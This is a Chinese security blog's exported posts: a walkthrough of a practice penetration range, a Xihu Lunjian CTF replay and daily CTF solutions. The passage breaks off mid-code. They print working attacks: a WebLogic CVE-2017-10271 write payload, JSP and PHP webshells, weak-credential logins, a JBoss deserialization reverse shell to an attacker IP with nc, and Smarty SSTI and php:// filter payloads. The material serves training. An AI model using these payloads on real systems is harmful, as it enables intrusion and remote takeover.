      </tags>
  </entry>
  <entry>
    <title>简单的靶场渗透</title>
    <url>/2022/01/03/%E7%AE%80%E5%8D%95%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">提示：一共12个flag，有内网。</span><br><span class="line">标准：5个合格</span><br><span class="line">靶场地址：http:&#x2F;&#x2F;1.14.65.168:8077&#x2F;m&#x2F;index.php</span><br><span class="line">刚过完年，来玩一玩</span><br></pre></td></tr></table></figure>

<p>[TOC]</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获得flag:</span><br><span class="line">1.14.65.168    </span><br><span class="line">        flag&#123;dc53e209ffa7f1cd8c7ebdc2eeff34a7&#125;    </span><br><span class="line">flag1 : flag&#123;f784234649d7ef161229349d1d76ba8d&#125;</span><br><span class="line"></span><br><span class="line">172.16.20.38tomcat</span><br><span class="line">flag3 ：flag&#123;03bbcaf39bdd08fa8d0d9e5477e102c5&#125;</span><br><span class="line"></span><br><span class="line">172.16.20.66</span><br><span class="line">flag5  :flag&#123;b717ca3e4543f05e6970ede833d68ba4&#125;</span><br><span class="line"></span><br><span class="line">172.16.20.76</span><br><span class="line">flag4  :flag&#123;22fceae28669c34d139f7ff6db690acb&#125; </span><br><span class="line"></span><br><span class="line">172.16.20.135</span><br><span class="line">flag9  :flag&#123;27e6221a8a55c8ee7396e74531dc7d9d&#125;</span><br></pre></td></tr></table></figure>





<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>Powered by <a href="http://www.dedecms.com/"><strong>DedeCMSV57_UTF8_SP1</strong></a> </p>
<p><a href="http://1.14.65.168:8077/data/admin/ver.txt">http://1.14.65.168:8077/data/admin/ver.txt</a>       版本时间20170303</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><a href="http://1.14.65.168:8077/dede/">http://1.14.65.168:8077/dede/</a>             admin/admin 后台弱口令</p>
<p>后台任意文件上传</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102150406908.png" alt="image-20220102150406908"></p>
<p>哥斯拉连接，看了要提权</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102151302899.png" alt="image-20220102151302899"></p>
<p>html目录下     第一个flag{dc53e209ffa7f1cd8c7ebdc2eeff34a7}  ，或者robots.txt 直接给的有路径</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102151350497.png" alt="image-20220102151350497"></p>
<p>根目录下   第二个flag{f784234649d7ef161229349d1d76ba8d}</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102151427997.png" alt="image-20220102151427997"></p>
<p>本机为172.16.20.66</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102152600971.png" alt="image-20220102152600971"></p>
<h2 id="内网其他主机扫描"><a href="#内网其他主机扫描" class="headerlink" title="内网其他主机扫描"></a>内网其他主机扫描</h2><p>发现某位师傅的fscan（<a href="https://github.com/shadow1ng/fscan">shadow1ng/fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。 (github.com)</a>），正好对内网172.16.20.* 网段存活主机扫描</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102155438573.png" alt="image-20220102155438573"></p>
<p>发现其他5台存活主机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(icmp) Target &#39;172.16.20.38&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.62&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.66&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.76&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.135&#39; is alive</span><br><span class="line">icmp alive hosts len is: 5</span><br><span class="line">172.16.20.38:8009 open</span><br><span class="line">172.16.20.135:8009 open</span><br><span class="line">172.16.20.66:1080 open</span><br><span class="line">172.16.20.135:8080 open</span><br><span class="line">172.16.20.76:8080 open</span><br><span class="line">172.16.20.38:8080 open</span><br><span class="line">172.16.20.62:7001 open</span><br><span class="line">172.16.20.66:80 open</span><br><span class="line">172.16.20.135:8093 open</span><br><span class="line">172.16.20.135:8083 open</span><br><span class="line">alive ports len is: 10</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.62:7001  code:404 len:1164   title:Error 404--Not Found</span><br><span class="line">[+] InfoScan:http:&#x2F;&#x2F;172.16.20.62:7001  [weblogic] </span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.76:8080  code:302 len:0      title:None</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.135:8083 code:400 len:0      title:None</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.76:8080&#x2F;login;jsessionid&#x3D;0DDFC6D0809CA87D818E92B67A8CFC33 code:200 len:10     title:Login Page</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.38:8080  code:200 len:20     title:Apache Tomcat&#x2F;8.0.43</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.135:8080 code:200 len:1507   title:Welcome to JBoss&amp;trade;</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.66       code:200 len:12     title:我的网站</span><br><span class="line">[+] InfoScan:http:&#x2F;&#x2F;172.16.20.76:8080&#x2F;login;jsessionid&#x3D;0DDFC6D0809CA87D818E92B67A8CFC33 [Shiro] </span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2020-14750</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2017-10271</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-ssrf</span><br><span class="line">[+] InfoScan:http:&#x2F;&#x2F;172.16.20.135:8080 [Jboss JBOSS] </span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.38:8080&#x2F;manager&#x2F;html tomcat tomcat</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.38:8080 poc-yaml-tomcat-manager-week</span><br></pre></td></tr></table></figure>







<h2 id="挂代理"><a href="#挂代理" class="headerlink" title="挂代理"></a>挂代理</h2><p>frp 代理出现两个问题，</p>
<p>1，我的frpc竟然不能运行，重新下载了</p>
<p>2，这个报错是frpc.ini里面的注释没有删除</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102164513360.png" alt="image-20220102164513360"></p>
<p>终于代理好了，</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102164839124.png" alt="image-20220102164839124"></p>
<p>下面就一个一个网站看吧</p>
<h3 id="172-16-20-38-tomcat"><a href="#172-16-20-38-tomcat" class="headerlink" title="172.16.20.38 tomcat"></a>172.16.20.38 tomcat</h3><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102165200772.png" alt="image-20220102165200772"></p>
<p><a href="http://172.16.20.38:8080/manager/html">http://172.16.20.38:8080/manager/html</a> </p>
<p>tomcat tomcat登陆，进入后台</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102165822763.png" alt="image-20220102165822763"></p>
<p>Tomcat 后台部署war木马getshell       哥斯拉生成shel.jsp，jar -cvf sh.war shel.jsp</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102172206117.png" alt="image-20220102172206117"></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102173735362.png" alt="image-20220102173735362"></p>
<p><a href="http://172.16.20.38:8080/sh/shel.jsp">http://172.16.20.38:8080/sh/shel.jsp</a>  </p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102173917456.png" alt="image-20220102173917456"></p>
<p>拿到flag3 ：flag{03bbcaf39bdd08fa8d0d9e5477e102c5}</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102174042500.png" alt="image-20220102174042500"></p>
<p>root权限，双网卡发现inet 10.2.5.20/20 brd 10.2.15.255 scope global eth1  另一个网段10.2.5.*</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102174312642.png" alt="image-20220102174312642"></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102174301803.png" alt="image-20220102174301803"></p>
<h3 id="172-16-20-62-weblogic"><a href="#172-16-20-62-weblogic" class="headerlink" title="172.16.20.62 weblogic"></a>172.16.20.62 weblogic</h3><p><a href="http://172.16.20.62:7001/">http://172.16.20.62:7001</a>  fscan扫出来的是weblogic</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2020-14750</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2017-10271</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-ssrf</span><br></pre></td></tr></table></figure>



<p>能访问<a href="http://172.16.20.62:7001/wls-wsat/CoordinatorPortType11%E8%AF%B4%E6%98%8E%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8cve-2017-10271%E6%BC%8F%E6%B4%9E">http://172.16.20.62:7001/wls-wsat/CoordinatorPortType11说明可能存在cve-2017-10271漏洞</a></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102181059955.png" alt="image-20220102181059955"></p>
<p>我说咋不能利用exp，原来，burp没有挂代理。。。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">172.16</span>.<span class="number">20.62</span>:<span class="number">7001</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">95.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">95.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">DNT: 1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br><span class="line"><span class="comment">Content-Type: text/xml</span></span><br><span class="line"><span class="comment">Content-Length: 3282</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="comment">      &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="comment">        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span></span><br><span class="line"><span class="comment">         &lt;java version=&quot;1.6.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span></span><br><span class="line"><span class="comment">                    &lt;object class=&quot;java.io.PrintWriter&quot;&gt; </span></span><br><span class="line"><span class="comment">                        &lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/1.jsp&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;</span></span><br><span class="line"><span class="comment">                        &lt;string&gt;</span></span><br><span class="line"><span class="comment">&lt;![CDATA[&lt;% out.print(&quot;test&quot;); %&gt;]]&gt;&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;</span></span><br><span class="line"><span class="comment">                    &lt;/object&gt;</span></span><br><span class="line"><span class="comment">            &lt;/java&gt;</span></span><br><span class="line"><span class="comment">        &lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="comment">      &lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="comment">      &lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="comment">&lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;% out.print(&quot;test&quot;); %&gt; 换成对应jsp🐎</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103003302676.png" alt="image-20220103003302676"></p>
<p><a href="http://172.16.20.62:7001/wls-wsat/1.jsp">http://172.16.20.62:7001/wls-wsat/1.jsp</a></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103003242901.png" alt="image-20220103003242901"></p>
<p>哥斯拉链接</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103002839036.png" alt="image-20220103002839036"></p>
<p>root用户，无其他网段</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103002921369.png" alt="image-20220103002921369"></p>
<p>flag5  :flag{b717ca3e4543f05e6970ede833d68ba4}</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103003009202.png" alt="image-20220103003009202"></p>
<h3 id="172-16-20-76-Shiro"><a href="#172-16-20-76-Shiro" class="headerlink" title="172.16.20.76 Shiro"></a>172.16.20.76 Shiro</h3><p>[*] WebTitle:<a href="http://172.16.20.76:8080/login;jsessionid=0DDFC6D0809CA87D818E92B67A8CFC33">http://172.16.20.76:8080/login;jsessionid=0DDFC6D0809CA87D818E92B67A8CFC33</a> code:200 len:10     title:Login Page</p>
<p>确定为Shiro</p>
<p>用工具<a href="https://github.com/j1anFen/shiro_attack/releases">https://github.com/j1anFen/shiro_attack/releases</a></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103021106383-16411470674991.png" alt="image-20220103021106383"></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103021136691.png" alt="image-20220103021136691"></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103021026217.png" alt="image-20220103021026217"></p>
<h3 id="172-16-20-135-JBoss"><a href="#172-16-20-135-JBoss" class="headerlink" title="172.16.20.135 JBoss"></a>172.16.20.135 JBoss</h3><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102231302358.png" alt="image-20220102231302358"></p>
<ul>
<li><p><a href="http://172.16.20.135:8080/web-console/">JBoss Web Console</a></p>
<p>  admin  admin 进入</p>
</li>
</ul>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102230723865.png" alt="image-20220102230723865"></p>
<p>确定版本可以使用CVE-2017-7504  [JBoss 4.x JBossMQ JMS 反序列化漏洞]([（CVE 2017 7504）JBoss 4.x JBossMQ JMS 反序列化漏洞 - Wiki (96.mk)](<a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Jboss/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2017-7504%EF%BC%89JBoss">https://wiki.96.mk/Web安全/Jboss/反序列化漏洞/（CVE-2017-7504）JBoss</a> 4.x JBossMQ JMS 反序列化漏洞/))</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo git clone https:&#x2F;&#x2F;github.com&#x2F;ianxtianxt&#x2F;CVE-2015-7501.git</span><br><span class="line"></span><br><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.1.192:4444（IP是攻击机ip,4444是要监听的端口)</span><br><span class="line"></span><br><span class="line">nc -lvnp 4444</span><br><span class="line">curl http:&#x2F;&#x2F;172.16.20.135:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>



<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102233858765.png" alt="image-20220102233858765"></p>
<p>root权限</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102234228765.png" alt="image-20220102234228765"></p>
<p>inet 10.2.5.62/20 brd 10.2.15.255 scope global eth1    发现10.2.5.*网段</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102234258565.png" alt="image-20220102234258565"></p>
<hr>
<p>干不动了，二层三层内网后续更新，哎实际上就是代理+漏洞复现。</p>
<p>感悟：第一是工具，第二是漏洞不是很敏感</p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>西湖论剑web复现</title>
    <url>/2020/10/17/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020-10-17/</url>
    <content><![CDATA[<h3 id="web-esayjson"><a href="#web-esayjson" class="headerlink" title="web-esayjson"></a>web-esayjson</h3><blockquote>
<p><a href="http://easyjson.xhlj.wetolink.com/">http://easyjson.xhlj.wetolink.com/</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;security.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))&#123;   <span class="comment">//source不能为空</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$sandbox = <span class="string">&#x27;sandbox/&#x27;</span>.sha1($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>; <span class="comment">//沙盒，设置沙盒根据自己ip获得目录</span></span><br><span class="line">var_dump($sandbox);</span><br><span class="line"><span class="keyword">if</span>(!file_exists($sandbox))&#123;    <span class="comment">//没有就创建沙盒</span></span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    file_put_contents($sandbox.<span class="string">&quot;index.php&quot;</span>,<span class="string">&quot;&lt;?php echo &#x27;Welcome To Dbapp OSS.&#x27;;?&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$action = $_GET[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">$content = file_get_contents(<span class="string">&quot;php://input&quot;</span>); <span class="comment">//POST传入</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($action == <span class="string">&quot;write&quot;</span> &amp;&amp;  SecurityCheck(<span class="string">&#x27;filename&#x27;</span>,$_GET[<span class="string">&#x27;filename&#x27;</span>]) &amp;&amp;SecurityCheck(<span class="string">&#x27;content&#x27;</span>,$content))&#123;</span><br><span class="line">    $content = json_decode($content);  </span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    $filecontent = $content-&gt;content;</span><br><span class="line">    $filename = $sandbox.$filename;</span><br><span class="line">    file_put_contents($filename,$filecontent.<span class="string">&quot;\n Powered By Dbapp OSS.&quot;</span>); <span class="comment">//json格式内容写入</span></span><br><span class="line">&#125;<span class="keyword">elseif</span>($action == <span class="string">&quot;reset&quot;</span>)&#123;</span><br><span class="line">    $files = scandir($sandbox);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_dir($file))&#123;</span><br><span class="line">            <span class="keyword">if</span>($file !== <span class="string">&quot;index.php&quot;</span>)&#123;</span><br><span class="line">                unlink($sandbox.$file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Security Check Failed.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p><a href="https://blog.csdn.net/weixin_30940783/article/details/95444711">file_get_contents(“php://input”)理解</a></p>
<blockquote>
<p>思路：先生成一个沙盒目录，写入json格式内容，读取flag</p>
</blockquote>
<p>SecurityCheck()函数会对json格式的内容进行验证，对<code>content</code>这个变量进行了过滤。并且filename这个参数可以后缀名是<code>.php</code>而且不能的数字</p>
<p>json格式进行绕过：<a href="https://xz.aliyun.com/t/306">浅谈json参数解析对waf绕过的影响</a></p>
<p>wp测试说<a href="https://tool.chinaz.com/tools/unicode.aspx">unicode编码</a>可以绕过</p>
<p><img src="/2020/10/17/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020-10-17/1.png" alt="1"></p>
<p><img src="/2020/10/17/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020-10-17/2.png" alt="1"></p>
<p><a href="https://mp.weixin.qq.com/s/Jbdd3Oa8MnymI-ooJA-t0w">参考官方wp</a></p>
<hr>
<p>内容也可以写入<code>&#123;&quot;content&quot;:&quot;&lt;?php $_GET[0]($_GET[1]);? &gt;&quot;&#125;</code>的 编码</p>
<p>然后<a href="http://easyjson.xhlj.wetolink.com/sandbox/8ff393509060e51038c905a23f595aa3c9454ef6/?0=system&amp;1=/readflag">http://easyjson.xhlj.wetolink.com/sandbox/8ff393509060e51038c905a23f595aa3c9454ef6/?0=system&amp;1=/readflag</a> 获得flag</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&mid=2247485137&idx=1&sn=a1d922b42556987ba5faa934cfb70218&chksm=e8a22500dfd5ac16c3fbba18d42f53ed6946fa98aaffc5d2829398e70b5fae2f85157889c32d&mpshare=1&scene=23&srcid=1012k3QtXa1fT24ENVA2p5fy&sharer_sharetime=1602491754980&sharer_shareid=8d22639189eb829cec87293a984e60e9#rd">参考文章</a>                                                <a href="https://blog.csdn.net/qq_46091464/article/details/108967312?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-11-108967312.nonecase&utm_term=%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91&spm=1000.2123.3001.4430">参考2</a></p>
<hr>
<h3 id="HardXSS"><a href="#HardXSS" class="headerlink" title="HardXSS"></a>HardXSS</h3><hr>
<blockquote>
<p><a href="https://xss.hardxss.xhlj.wetolink.com/">https://xss.hardxss.xhlj.wetolink.com/</a></p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s/QjwUMa7SNS5gDsDxC-e19Q">wp</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>2020西湖论剑web</tag>
      </tags>
  </entry>
  <entry>
    <title>One step a day</title>
    <url>/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/</url>
    <content><![CDATA[<h2 id="2020-11-4-SSTI模板注入"><a href="#2020-11-4-SSTI模板注入" class="headerlink" title="2020.11.4-SSTI模板注入"></a>2020.11.4-SSTI模板注入</h2><blockquote>
<h2 id="BJDCTF2020-The-mystery-of-ip-1"><a href="#BJDCTF2020-The-mystery-of-ip-1" class="headerlink" title="[BJDCTF2020]The mystery of ip 1"></a>[BJDCTF2020]The mystery of ip 1</h2></blockquote>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020.11.4/1.png" alt="image-20200926194608129"></p>
<a id="more"></a>

<p>第一眼看到题目就感觉这道题应该不难，问题应该出在IP这个地方。实在不知道怎么写就在网上看了下<a href="https://www.cnblogs.com/wangtanzhi/p/12318630.html">wp</a>,flask框架</p>
<p>以前确实没有见到过**<em>SSTI模板注入**</em></p>
<hr>
<h5 id="知识点理解："><a href="#知识点理解：" class="headerlink" title="知识点理解："></a>知识点理解：</h5><p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020.11.4/4.png" alt="1"></p>
<p>SSTI(Server-Side Template Injection)，即服务端模板注入攻击，恶意构造输入数据，从而造成文件读取或者getshell</p>
<p>一些模板引擎：Smarty，Mako，Jinja2，Jade，Velocity，Freemaker和Twig</p>
<p>拓展：</p>
<p>遇到flask框架反应就是SSTI模板注入</p>
<p><a href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8">浅析SSTI（python沙盒绕过)</a></p>
<p> talmap工具可以实现自动化检测</p>
<hr>
<h5 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h5><p>提示了ip，可能与XFF有关，能修改ip说明可控</p>
<p>经smarty注入payload 测试  ，可控</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;&#x2F;if&#125;</span><br><span class="line">&#123;if system(&#39;ls&#39;)&#125;&#123;&#x2F;if&#125;</span><br><span class="line">&#123; readfile(&#39;&#x2F;flag&#39;) &#125;</span><br><span class="line">&#123;if show_source(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;</span><br><span class="line">&#123;if system(&#39;cat ..&#x2F;..&#x2F;..&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125; #本题payload</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020.11.4/2.png" alt="image-20200926194608129"></p>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020.11.4/3.png" alt="image-20200926194608129"></p>
<hr>
<h2 id="2020-11-5-命令执行"><a href="#2020-11-5-命令执行" class="headerlink" title="2020.11.5-命令执行"></a>2020.11.5-命令执行</h2><blockquote>
<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2></blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<!--more-->

<p>爱了爱了，代码审计</p>
<p>出现了file_get_contents()和include()函数,所以我们需要用php伪协议传入<code>text</code>和<code>file</code>的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have a dream&amp;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020.11.5/1.png" alt="2"></p>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020.11.5/2.png" alt="1"></p>
<p>进行base64解码得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$_SESSION[<span class="string">&#x27;id&#x27;</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params">$re, $str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . $re . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span 